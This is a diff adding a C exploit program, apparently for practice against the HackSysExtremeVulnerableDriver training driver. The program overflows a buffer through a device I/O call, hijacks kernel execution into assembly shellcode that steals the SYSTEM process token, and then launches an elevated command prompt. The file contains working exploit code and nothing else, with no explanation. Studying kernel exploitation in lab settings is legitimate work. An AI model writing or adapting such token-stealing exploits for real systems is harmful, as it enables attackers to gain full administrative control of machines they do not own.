@@ -1,0 +1,54 @@
+#include <windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+HANDLE hDriver;
+DWORD dw;
+VOID ShellCode()
+{
+	__asm
+	{
+		//int 3
+		pop    edi
+		pop    esi
+		pop    ebx
+		pushad
+		mov eax, fs: [124h]
+		mov eax, [eax + 050h]
+		mov ecx, eax
+		mov edx, 4
+
+		findpid :
+		mov eax, [eax + 0b8h]
+		sub eax, 0b8h
+		cmp[eax + 0b4h], edx
+		jnz findpid
+
+		mov edx, [eax + 0f8h]
+		mov[ecx + 0f8h], edx
+		popad
+		pop ebp
+		ret 8
+	}
+}
+int main() {
+	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE hDevice;
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return -1;
+	}
+
+	ULONG buf[0x824/4]{};
+	buf[0x824 / 4 - 1] = (DWORD)&ShellCode;
+	DeviceIoControl(hDriver, 0x222003, buf, 0x824 , 0, 0, &dw, NULL);
+
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	return 0;
+}
